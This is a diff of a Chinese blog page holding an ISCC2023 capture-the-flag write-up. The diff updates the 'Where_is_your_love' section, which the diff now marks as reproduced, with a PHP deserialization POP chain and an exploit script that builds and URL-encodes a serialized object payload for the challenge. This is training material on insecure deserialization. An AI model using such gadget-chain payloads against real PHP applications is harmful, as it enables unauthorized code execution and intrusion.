@@ -74,7 +74,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fa-brands fa-readme"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BE%8A%E4%BA%86%E4%B8%AA%E7%BE%8A"><span class="toc-text">羊了个羊</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Where-is-your-love-%E6%9C%AA%E5%AE%8C%E6%88%90"><span class="toc-text">Where_is_your_love(未完成)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REVERSE"><span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E5%BD%A2%E8%AE%B0"><span class="toc-text">变形记</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BE%8A%E4%BA%86%E4%B8%AA%E7%BE%8A"><span class="toc-text">羊了个羊</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Where-is-your-love%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-text">Where_is_your_love（复现）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REVERSE"><span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E5%BD%A2%E8%AE%B0"><span class="toc-text">变形记</span></a></li></ol></li></ol>
     </div>
   
         
@@ -248,7 +248,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">617字</span>
+        <span class="post-count">699字</span>
       </span>
     </span>
 
@@ -257,7 +257,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">2分</span>
+        <span class="post-count">3分</span>
       </span>
     </span>
     
@@ -290,7 +290,10 @@
 <p><img src="/blog/2023/05/01/ISCC2023-Writeup/image-20230501085336735.png" alt="image-20230501085336735"></p>
 <p>base64解密两次得到flag</p>
 <p><img src="/blog/2023/05/01/ISCC2023-Writeup/image-20230501085549833.png" alt="image-20230501085549833"></p>
-<h2 id="Where-is-your-love-未完成"><a href="#Where-is-your-love-未完成" class="headerlink" title="Where_is_your_love(未完成)"></a>Where_is_your_love(未完成)</h2><p>和第一题一样的方式看到网页源码</p>
+<h2 id="Where-is-your-love（复现）"><a href="#Where-is-your-love（复现）" class="headerlink" title="Where_is_your_love（复现）"></a>Where_is_your_love（复现）</h2><blockquote>
+<p>反序列化+RSA</p>
+</blockquote>
+<p>和第一题一样的方式看到网页源码</p>
 <p><img src="/blog/2023/05/01/ISCC2023-Writeup/image-20230501094521029.png" alt="image-20230501094521029"></p>
 <p>发现三个路由</p>
 <p><strong>LoveStory.php</strong></p>
@@ -351,11 +354,48 @@ if (isset($_GET[&quot;iscc&quot;])) &#123;
     highlight_file(__FILE__); 
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>题目是寻找你的爱情故事</p>
-<p>所以pop的方向也应顺着它</p>
-<p><code>boy-&gt;girl-&gt;helper-&gt;love_story</code></p>
-<p>目前未知 array_walk($this, function($make, $colo) 如何给 $make, $colo传参</p>
-<p>按推理应给是 $var[$name](); 此条传参</p>
+<p>出口是<code>love_story::love()</code>，</p>
+<p>链子：</p>
+<p><code>boy::__destruct() -&gt; girl::__call() -&gt; helper::__isset() -&gt; boy::__toString() -&gt; helper::__get() -&gt; love_story::love()</code></p>
+<p>exp：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">boy</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$like</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">like</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">girl</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$boyname</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">boyname</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">helper</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword type-declaration">string</span> <span class="token operator">=</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">love_story</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$fall_in_love</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">=></span><span class="token string double-quoted-string">"girl_and_boy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$gir1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">girl</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'et3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$hel1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'et3'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'et3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$lov1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">love_story</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$boy1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">boy</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'et3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$hp1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'string'</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">love_story</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"love"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$bo1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">boy</span><span class="token punctuation">(</span><span class="token variable">$hp1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$hp2</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'et3'</span><span class="token punctuation">,</span><span class="token variable">$bo1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$gi1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">girl</span><span class="token punctuation">(</span><span class="token variable">$hp2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$bo2</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">boy</span><span class="token punctuation">(</span><span class="token variable">$gi1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$final</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$bo2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$final</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><strong>Download.php</strong></p>
 <p>获得一串.pem公钥</p>
 <p><strong>enc.php</strong></p>
